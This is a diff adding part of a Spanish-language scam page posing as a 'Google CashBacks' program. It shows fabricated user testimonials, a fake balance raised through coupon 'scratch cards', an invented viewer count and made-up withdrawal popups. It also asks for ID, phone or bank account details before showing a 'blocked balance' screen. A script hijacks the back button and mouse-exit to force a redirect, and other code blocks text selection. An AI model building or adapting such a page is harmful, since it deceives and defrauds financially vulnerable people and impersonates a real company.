+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>127</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comentario 2 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #EA4335, #FBBC05)">PL</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@pedro.lopez_ar</span>
+                                <span class="vsl-comment-time">hace 3 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                Confieso que al principio pensé que era estafa, desconfié demasiado. Pero vi el video completo, entendí cómo funciona y decidí probar. ¡Es REAL! Llegó en 5 minutos. Perdón por haber dudado 😅
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>89</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comentario 3 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #34A853, #4285F4)">JR</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@juliana.rodriguez</span>
+                                <span class="vsl-comment-time">hace 4 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                Mi mamá me mandó este link y yo pensé "ahí viene la estafa" jajaja pero lo hice para que dejara de insistir. ¿¿GENTE?? ¡¡Llegó de verdad!! Ahora yo soy la que lo mando a todos 🤣💰
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>156</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comentario 4 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #FBBC05, #EA4335)">RF</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@rafael.fernandez_co</span>
+                                <span class="vsl-comment-time">hace 5 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                Trabajo en TI hace 15 años y puedo confirmar: esto es legítimo. Google realmente tiene estos programas de cashback acumulado. Hice el mío y recibí al instante. ¡Recomiendo ver el video completo para entender bien! 👨‍💻✅
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>203</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comentario 5 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #9C27B0, #E91E63)">AS</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@amanda.santos_</span>
+                                <span class="vsl-comment-time">hace 6 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                ¡Lo usé para pagar la cuenta de luz que estaba atrasada! No tienen idea del alivio que sentí. ¡Gracias Google! 🏠💡
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>178</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comentario 6 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #00BCD4, #009688)">LC</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@lucas.carvalho22</span>
+                                <span class="vsl-comment-time">hace 7 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                ¡¡¡FUNCIONÓÓÓ!!! 🎉🎉🎉 ¡¡Acabo de recibir $230 por transferencia!! Lo voy a usar para comprar el regalo de cumpleaños de mi novia. ¡¡Muchas gracias!!
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M2 20h2c.55 0 1-.45 1-1v-9c0-.55-.45-1-1-1H2v11zm19.83-7.12c.11-.25.17-.52.17-.8V11c0-1.1-.9-2-2-2h-5.5l.92-4.65c.05-.22.02-.46-.08-.66-.23-.45-.52-.86-.88-1.22L14 2 7.59 8.41C7.21 8.79 7 9.3 7 9.83v7.84C7 18.95 8.05 20 9.34 20h8.11c.7 0 1.36-.37 1.72-.97l2.66-6.15z"/></svg>
+                                    <span>145</span>
+                                </div>
+                                <div class="vsl-comment-action">
+                                    <span>Responder</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Comments Closed Notice -->
+                <div class="vsl-comments-closed">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m0 0v2m0-2h2m-2 0H9m3-10V4m0 0a9 9 0 110 18 9 9 0 010-18z" />
+                    </svg>
+                    <span>Los comentarios están cerrados hasta el fin de la presentación.</span>
+                </div>
+            </section>
+        </div>
+
+        <!-- Loading State -->
+        <div class="loading-container" id="loadingState">
+            <div class="google-loader">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <p class="loading-text" id="loadingText">Procesando...</p>
+        </div>
+    </main>
+
+    <!-- VSL Notification Popup -->
+    <div class="vsl-notification-popup" id="vslNotificationPopup">
+        <div class="vsl-notification-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+            </svg>
+        </div>
+        <div class="vsl-notification-content">
+            <div class="vsl-notification-title" id="vslNotificationTitle">María García</div>
+            <div class="vsl-notification-text">Acaba de retirar <span class="amount">$230,00</span></div>
+        </div>
+    </div>
+
+    <!-- Confetti Container -->
+    <div class="confetti-container" id="confettiContainer"></div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <p class="footer-copyright">Copyright © 2025 | Google CashBacks</p>
+            <div class="footer-links">
+                <a href="#">Políticas de Privacidad</a>
+                <a href="#">Términos de uso</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ============ AUDIO CONTEXT ============
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        let audioCtx = null;
+
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new AudioContext();
+            }
+        }
+
+        function playCoinSound() {
+            initAudio();
+            if (!audioCtx) return;
+
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            oscillator.type = 'sine';
+            oscillator.frequency.setValueAtTime(1200, audioCtx.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(1800, audioCtx.currentTime + 0.1);
+            oscillator.frequency.exponentialRampToValueAtTime(2400, audioCtx.currentTime + 0.15);
+
+            gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+
+            oscillator.start(audioCtx.currentTime);
+            oscillator.stop(audioCtx.currentTime + 0.3);
+
+            setTimeout(() => {
+                const osc2 = audioCtx.createOscillator();
+                const gain2 = audioCtx.createGain();
+
+                osc2.connect(gain2);
+                gain2.connect(audioCtx.destination);
+
+                osc2.type = 'sine';
+                osc2.frequency.setValueAtTime(2600, audioCtx.currentTime);
+                osc2.frequency.exponentialRampToValueAtTime(3200, audioCtx.currentTime + 0.1);
+
+                gain2.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
+
+                osc2.start(audioCtx.currentTime);
+                osc2.stop(audioCtx.currentTime + 0.2);
+            }, 100);
+        }
+
+        function playSuccessSound() {
+            initAudio();
+            if (!audioCtx) return;
+
+            const notes = [523.25, 659.25, 783.99, 1046.50];
+            
+            notes.forEach((freq, i) => {
+                setTimeout(() => {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+
+                    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+
+                    osc.start(audioCtx.currentTime);
+                    osc.stop(audioCtx.currentTime + 0.3);
+                }, i * 100);
+            });
+        }
+
+        // ============ STATE ============
+        let currentEval = 0;
+        let balance = 100;
+        let currentCouponCode = '';
+        let selectedPixType = null;
+
+        // 3 productos variados y diferentes (suma = $130 → total final $230)
+        const products = [
+            {
+                name: 'Smartwatch Premium',
+                store: 'Amazon',
+                image: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400&q=80',
+                value: 63.12,
+                coupon: 'APPL'
+            },
+            {
+                name: 'Auriculares Bluetooth',
+                store: 'Walmart',
+                image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400&q=80',
+                value: 21.88,
+                coupon: 'NIKE'
+            },
+            {
+                name: 'Cafetera Eléctrica',
+                store: 'eBay',
+                image: 'https://brainfuell.online/wp-content/uploads/2025/12/cafeteira-arno-com-filtro-preferita-inox-cfpf_1212690_1.webp',
+                value: 45.00,
+                coupon: 'TVHD'
+            }
+        ];
+
+        // ============ CONFETTI ============
+        function createConfetti() {
+            const container = document.getElementById('confettiContainer');
+            container.innerHTML = '';
+            
+            const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853'];
+            
+            for (let i = 0; i < 60; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti-piece';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDuration = (2 + Math.random() * 2) + 's';
+                confetti.style.animationDelay = Math.random() * 0.5 + 's';
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                container.appendChild(confetti);
+            }
+
+            setTimeout(() => {
+                container.innerHTML = '';
+            }, 4000);
+        }
+
+        // ============ NAVIGATION ============
+        function hideAllSteps() {
+            document.querySelectorAll('.step').forEach(s => {
+                s.classList.remove('active');
+            });
+            document.getElementById('loadingState').classList.remove('show');
+        }
+
+        function showStep(stepId) {
+            hideAllSteps();
+            setTimeout(() => {
+                document.getElementById(stepId).classList.add('active');
+            }, 200);
+        }
+
+        function showLoading(text) {
+            hideAllSteps();
+            document.getElementById('loadingText').textContent = text;
+            setTimeout(() => {
+                document.getElementById('loadingState').classList.add('show');
+            }, 200);
+        }
+
+        function updateProgress() {
+            const percent = Math.round((currentEval / 3) * 100);
+            document.getElementById('progressPercent').textContent = percent + '%';
+            document.getElementById('progressFill').style.width = percent + '%';
+        }
+
+        function updateBalance() {
+            const display = document.getElementById('balanceDisplay');
+            display.classList.add('pop');
+            display.textContent = '$ ' + balance.toFixed(2).replace('.', ',');
+            setTimeout(() => display.classList.remove('pop'), 300);
+        }
+
+        function formatCurrency(value) {
+            return '$ ' + value.toFixed(2).replace('.', ',');
+        }
+
+        // ============ FLOW FUNCTIONS ============
+        function startEvaluations() {
+            initAudio();
+            loadScratchCard(0);
+        }
+
+        function loadScratchCard(index) {
+            if (index >= products.length) return;
+
+            const product = products[index];
+            currentCouponCode = product.coupon;
+            
+            document.getElementById('scratchValueDisplay').textContent = formatCurrency(product.value);
+            document.getElementById('scratchCodeValue').textContent = product.coupon;
+            document.getElementById('scratchCount').textContent = index + 1;
+
+            document.querySelectorAll('#couponInputContainer .coupon-input').forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            document.getElementById('couponError').classList.remove('show');
+
+            showStep('stepScratch');
+        }
+
+        function loadProduct(index) {
+            if (index >= products.length) return;
+            currentCouponCode = products[index].coupon;
+        }
+
+
+        // ============ COUPON INPUT ============
+        function handleCouponInput(input) {
+            const value = input.value.toUpperCase();
+            input.value = value;
+
+            if (value) {
+                input.classList.add('filled');
+                const index = parseInt(input.dataset.index);
+                const inputs = document.querySelectorAll('#couponInputContainer .coupon-input');
+                if (index < 3) {
+                    inputs[index + 1].focus();
+                }
+            } else {
+                input.classList.remove('filled');
+            }
+        }
+
+        function handleCouponKeyDown(event, input) {
+            if (event.key === 'Backspace' && !input.value) {
+                const index = parseInt(input.dataset.index);
+                const inputs = document.querySelectorAll('#couponInputContainer .coupon-input');
+                if (index > 0) {
+                    inputs[index - 1].focus();
+                }
+            }
+        }
+
+        function verifyCoupon() {
+            const inputs = document.querySelectorAll('#couponInputContainer .coupon-input');
+            let enteredCode = '';
+            inputs.forEach(input => enteredCode += input.value.toUpperCase());
+
+            if (enteredCode === currentCouponCode) {
+                document.getElementById('couponError').classList.remove('show');
+                showLoading('Validando cashback...');
+
+                setTimeout(() => {
+                    const product = products[currentEval];
+                    balance += product.value;
+                    updateBalance();
+
+                    currentEval++;
+                    updateProgress();
+
+                    playSuccessSound();
+                    createConfetti();
+
+                    document.getElementById('loadingState').classList.remove('show');
+
+                    // Avançar automaticamente após breve delay
+                    setTimeout(() => {
+                        if (currentEval < products.length) {
+                            loadScratchCard(currentEval);
+                        } else {
+                            // Todas las evaluaciones completadas - mostrar pantalla de Felicidades
+                            document.getElementById('finalBalanceValue').textContent = formatCurrency(balance);
+                            showStep('stepParabens');
+                            
+                            setTimeout(() => {
+                                playSuccessSound();
+                                createConfetti();
+                            }, 500);
+                        }
+                    }, 1500);
+                }, 1500);
+            } else {
+                document.getElementById('couponError').classList.add('show');
+                inputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                inputs[0].focus();
+            }
+        }
+
+        // ============ PIX FUNCTIONS ============
+        function selectPixOption(element, type) {
+            // Remove selected from all
+            document.querySelectorAll('.pix-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            
+            // Add selected to clicked
+            element.classList.add('selected');
+            selectedPixType = type;
+
+            // Show input field
+            const inputContainer = document.getElementById('pixInputContainer');
+            const input = document.getElementById('pixInput');
+            inputContainer.classList.add('show');
+
+            // Update placeholder based on type
+            const placeholders = {
+                'dni': 'Escribe tu DNI / Cédula',
+                'email': 'Escribe tu correo electrónico',
+                'telefono': 'Escribe tu teléfono',
+                'cuenta': 'Escribe tu número de cuenta'
+            };
+            input.placeholder = placeholders[type];
+            input.value = '';
+            input.focus();
+        }
+
+        function realizarSaque() {
+            const pixInput = document.getElementById('pixInput');
+            
+            if (!selectedPixType) {
+                alert('Selecciona un tipo de dato bancario');
+                return;
+            }
+
+            if (!pixInput.value.trim()) {
+                alert('Escribe tu dato bancario');
+                pixInput.focus();
+                return;
+            }
+
+            showLoading('Procesando retiro...');
+
+            setTimeout(() => {
+                // Mostrar pantalla de saldo bloqueado
+                document.getElementById('blockedAmount').textContent = formatCurrency(balance);
+                showStep('stepBlocked');
+            }, 2000);
+        }
+
+        // ============ INIT ============
+        updateProgress();
+
+        // ============ VSL FUNCTIONS ============
+        const NOTIFICATION_INTERVAL = 120000; // 2 minutos
+        const VIEWERS_UPDATE_INTERVAL = 3000;
+        let viewersCount = 1847;
+        let vslNotificationInterval = null;
+        let vslViewersInterval = null;
+
+        const spanishFirstNames = [
+            "María", "Juan", "Ana", "Pedro", "Juliana", "Carlos", "Fernanda", "Lucas", "Camila", "Rafael",
+            "Mariana", "Bruno", "Leticia", "Gustavo", "Amanda", "Diego", "Laura", "Santiago", "Patricia", "Rodrigo"
+        ];
+
+        const spanishLastNames = [
+            "García", "Rodríguez", "Martínez", "López", "González", "Hernández", "Pérez", "Sánchez", "Ramírez", "Torres"
+        ];
+
+        const cities = [
+            "Ciudad de México, MX", "Buenos Aires, AR", "Bogotá, CO", "Lima, PE",
+            "Santiago, CL", "Madrid, ES", "Barcelona, ES", "Guadalajara, MX", "Medellín, CO",
+            "Monterrey, MX", "Córdoba, AR", "Quito, EC"
+        ];
+
+        function getRandomItem(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+
+        function getRandomNumber(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        function generateName() {
+            const firstName = getRandomItem(spanishFirstNames);
+            const lastName = getRandomItem(spanishLastNames);
+            return `${firstName} ${lastName}`;
+        }
+
+        function updateViewers() {
+            const change = getRandomNumber(-25, 35);
+            viewersCount = Math.max(1200, Math.min(2800, viewersCount + change));
+            const viewersEl = document.getElementById('viewersCount');
+            if (viewersEl) {
+                viewersEl.textContent = viewersCount.toLocaleString('es-ES');
+            }
+        }
+
+        function showVSLNotification() {
+            const popup = document.getElementById('vslNotificationPopup');
+            const name = generateName();
+            const city = getRandomItem(cities);
+
+            document.getElementById('vslNotificationTitle').textContent = `${name} de ${city}`;
+
+            popup.classList.add('show');
+
+            setTimeout(() => {
+                popup.classList.remove('show');
+            }, 4000);
+        }
+
+        // Código del Vturb - será inyectado solo cuando el usuario llegue a la VSL
+        var vslPlayerLoaded = false;
+        var vslPlayerCode = '<vturb-smartplayer id="ab-695c50259bd66cff295f17ab" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>';
+
+        function loadVSLPlayer() {
+            if (vslPlayerLoaded) return;
+            vslPlayerLoaded = true;
+            
+            // Inyecta el elemento del player
+            document.getElementById('vslPlayerContainer').innerHTML = vslPlayerCode;
+            
+            // Carga el script del player
+            var s = document.createElement("script");
+            s.src = "https://scripts.converteai.net/636faf3f-12ee-4657-8b11-2f0f19150575/ab-test/695c50259bd66cff295f17ab/player.js";
+            s.async = true;
+            document.head.appendChild(s);
+
+            // Script de delay para mostrar el botón
+            var delaySeconds = 1280;
+            var checkPlayer = setInterval(function() {
+                var player = document.querySelector("vturb-smartplayer");
+                if (player) {
+                    clearInterval(checkPlayer);
+                    player.addEventListener("player:ready", function() {
+                        player.displayHiddenElements(delaySeconds, [".esconder"], {
+                            persist: true
+                        });
+                    });
+                }
+            }, 100);
+        }
+
+        function showVSL() {
+            showStep('stepVSL');
+            
+            // Cargar el player solo ahora
+            loadVSLPlayer();
+            
+            // ===== ATIVAR BACKREDIRECT SOMENTE NA VSL =====
+            activateBackredirect();
+            
+            // Iniciar intervals de la VSL
+            if (!vslViewersInterval) {
+                vslViewersInterval = setInterval(updateViewers, VIEWERS_UPDATE_INTERVAL);
+            }
+            
+            if (!vslNotificationInterval) {
+                setTimeout(() => {
+                    showVSLNotification();
+                    vslNotificationInterval = setInterval(showVSLNotification, NOTIFICATION_INTERVAL);
+                }, 120000); // Primera notificación después de 2 minutos
+            }
+        }
+    </script>
+
+    <!-- ============ SISTEMA DE PROTECCIÓN ============ -->
+    <style>
+        /* Deshabilitar selección de texto */
+        body {
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+        }
+        
+        /* Deshabilitar arrastrar imágenes */
+        img {
+            -webkit-user-drag: none !important;
+            -khtml-user-drag: none !important;
+            -moz-user-drag: none !important;
+            -o-user-drag: none !important;
+            user-drag: none !important;
+        }
+        
+        /* Mantener inputs funcionando */
+        input, textarea, button, .coupon-input, .pix-input, .pix-option, .btn-google, .btn-taxa {
+            -webkit-user-select: auto !important;
+            -moz-user-select: auto !important;
+            -ms-user-select: auto !important;
+            user-select: auto !important;
+            pointer-events: auto !important;
+        }
+        
+        /* Mantener video/iframe funcionando */
+        iframe, vturb-smartplayer, .vsl-video-container, .vsl-video-container *, #vslPlayerContainer, #vslPlayerContainer * {
+            pointer-events: auto !important;
+        }
+    </style>
+
+        <script>
+(function () {
+  // 🔗 URL DE DESTINO (SEM UTMs)
+  const redirectUrl = "rdc.html";
+
+  // 🧠 Evita loop infinito
+  const flagKey = "exit_redirect_done";
+
+  // 📌 Captura UTMs da URL atual
+  function getUTMs() {
+    const params = new URLSearchParams(window.location.search);
+    const utms = {};
+    ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"].forEach(key => {
+      if (params.has(key)) utms[key] = params.get(key);
+    });
+    return utms;
+  }
+
+  // 🔗 Monta URL final com UTMs
+  function buildRedirectUrl() {
+    const utms = getUTMs();
+    const query = new URLSearchParams(utms).toString();
+    return query ? `${redirectUrl}?${query}` : redirectUrl;
+  }
+
+  // 🚀 Executa redirect
+  function redirect() {
+    if (sessionStorage.getItem(flagKey)) return;
+    sessionStorage.setItem(flagKey, "1");
+    window.location.href = buildRedirectUrl();
+  }
+
+  // 🖱️ DESKTOP: mouse sai da tela (tentativa de fechar)
+  document.addEventListener("mouseleave", function (e) {
+    if (e.clientY <= 0) {
+      redirect();
+    }
+  });
+
+  // 📱 MOBILE + DESKTOP: botão voltar
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function () {
+    redirect();
+  });
+
+})();
+</script>
+
+        
+
+   
+
+</body>
+</html>
